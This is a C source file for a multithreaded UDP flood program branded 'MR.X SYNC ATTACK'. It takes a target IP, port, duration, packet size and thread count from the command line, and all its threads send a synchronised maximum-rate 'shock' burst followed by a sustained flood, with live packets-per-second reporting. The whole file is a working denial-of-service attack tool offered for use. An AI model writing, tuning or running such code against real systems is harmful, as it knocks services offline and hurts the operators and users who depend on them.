#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
volatile int running = 1;
volatile int attack_started = 0;
pthread_t monitor_tid;
pthread_mutex_t start_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t start_cond = PTHREAD_COND_INITIALIZER;

void print_k_format(unsigned long long value, char *buffer) {
    if (value < 1000) sprintf(buffer, "%llu", value);
    else if (value < 1000000) sprintf(buffer, "%.1fK", value/1000.0);
    else sprintf(buffer, "%.1fM", value/1000000.0);
}

void* monitor_stats(void* arg) {
    unsigned long long last_packets = 0, last_bytes = 0;
    time_t start_time = time(NULL);
    
    while (running) {
        sleep(1);
        
        unsigned long long curr_packets = total_packets;
        unsigned long long curr_bytes = total_bytes;
        time_t elapsed = time(NULL) - start_time;
        
        unsigned long long pps = curr_packets - last_packets;
        unsigned long long bps = (curr_bytes - last_bytes) * 8;
        double mbps = bps / 1000000.0;
        unsigned long long avg_pps = elapsed > 0 ? curr_packets / elapsed : 0;
        
        char pps_str[32], total_str[32], avg_pps_str[32];
        print_k_format(pps, pps_str);
        print_k_format(curr_packets, total_str);
        print_k_format(avg_pps, avg_pps_str);
        
        fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %s avg pps | %.1f Mbps | %lds | X | 0 err\n",
                total_str, pps_str, avg_pps_str, mbps, elapsed);
        
        last_packets = curr_packets;
        last_bytes = curr_bytes;
    }
    return NULL;
}

void* attack_thread(void* arg) {
    int thread_id = *(int*)arg;
    
    // WAIT FOR ALL THREADS TO BE READY
    pthread_mutex_lock(&start_mutex);
    while (!attack_started) {
        pthread_cond_wait(&start_cond, &start_mutex);
    }
    pthread_mutex_unlock(&start_mutex);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int broadcast = 1;
    long sndbuf = 2000000000;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    target.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    char* packet = malloc(PACKET_SIZE);
    unsigned int seed = time(NULL) + thread_id;
    for(int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = (seed + i * 23) % 256;
    }
    
    time_t global_start = time(NULL);
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    
    // 💥 PHASE 1: INSTANT SHOCK (FIRST 2 SECONDS) - ALL THREADS SYNC
    time_t shock_end = global_start + 2;
    while(time(NULL) < shock_end && running) {
        // MAXIMUM SPEED - NO DELAYS
        for(int i = 0; i < 200; i++) {
            sendto(sock, packet, PACKET_SIZE, MSG_DONTWAIT,
                  (struct sockaddr*)&target, sizeof(target));
            local_packets++;
            local_bytes += PACKET_SIZE;
        }
        
        if (local_packets >= 1000) {
            __sync_fetch_and_add(&total_packets, local_packets);
            __sync_fetch_and_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    // 🚀 PHASE 2: SUSTAINED ATTACK (MIN 430K PPS)
    while (running && (time(NULL) - global_start) < DURATION_TIME) {
        time_t elapsed = time(NULL) - global_start;
        
        // REALISTIC PACKETS PER BURST
        int packets_per_burst;
        if (PACKET_SIZE <= 28) packets_per_burst = 120;
        else if (PACKET_SIZE <= 32) packets_per_burst = 100;
        else if (PACKET_SIZE <= 48) packets_per_burst = 80;
        else packets_per_burst = 60;
        
        // REALISTIC BURSTS PER SECOND
        int bursts_per_second;
        if (THREAD_COUNT >= 50) bursts_per_second = 80;
        else if (THREAD_COUNT >= 40) bursts_per_second = 90;
        else bursts_per_second = 100;
        
        // ENTERPRISE VM BOOST
        if (elapsed < 30) {
            packets_per_burst = packets_per_burst * 11 / 10;
        }
        
        // SEND BURSTS WITH MINIMAL DELAY
        for(int burst = 0; burst < bursts_per_second; burst++) {
            for(int i = 0; i < packets_per_burst; i++) {
                sendto(sock, packet, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr*)&target, sizeof(target));
                local_packets++;
                local_bytes += PACKET_SIZE;
            }
            
            // TINY DELAY BETWEEN BURSTS (MICROSECONDS)
            usleep(10000 / bursts_per_second);  // 10ms total delay per second
        }
        
        // UPDATE STATS
        if (local_packets >= 500) {
            __sync_fetch_and_add(&total_packets, local_packets);
            __sync_fetch_and_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        __sync_fetch_and_add(&total_packets, local_packets);
        __sync_fetch_and_add(&total_bytes, local_bytes);
    }
    
    free(packet);
    close(sock);
    return NULL;
}

int validate_ip(const char* ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx_sync [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (!validate_ip(TARGET_IP) || TARGET_PORT == 0) {
        fprintf(stderr, "Error: Invalid values\n");
        return 1;
    }
    
    printf("MR.X SYNC ATTACK Started 🔥🔥🔥\n");
    fflush(stdout);
    
    pthread_create(&monitor_tid, NULL, monitor_stats, NULL);
    
    pthread_t* threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int* thread_ids = malloc(THREAD_COUNT * sizeof(int));
    
    // CREATE ALL THREADS FIRST
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]);
    }
    
    // WAIT FOR ALL THREADS TO BE READY
    sleep(1);
    
    // START ALL THREADS SIMULTANEOUSLY
    pthread_mutex_lock(&start_mutex);
    attack_started = 1;
    pthread_cond_broadcast(&start_cond);
    pthread_mutex_unlock(&start_mutex);
    
    sleep(DURATION_TIME);
    running = 0;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_tid, NULL);
    
    double avg_pps = (double)total_packets / DURATION_TIME;
    double avg_mbps = (total_bytes * 8.0) / (DURATION_TIME * 1000000.0);
    
    char total_str[32], pps_str[32], avg_pps_str[32];
    print_k_format(total_packets, total_str);
    print_k_format((unsigned long long)avg_pps, pps_str);
    print_k_format((unsigned long long)avg_pps, avg_pps_str);
    
    fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %s avg pps | %.1f Mbps | %ds | X | 0 err\n",
            total_str, pps_str, avg_pps_str, avg_mbps, DURATION_TIME);
    
    printf("MR.X SYNC ATTACK Completed 🔥🔥🔥\n");
    fflush(stdout);
    
    free(threads);
    free(thread_ids);
    
    return 0;
}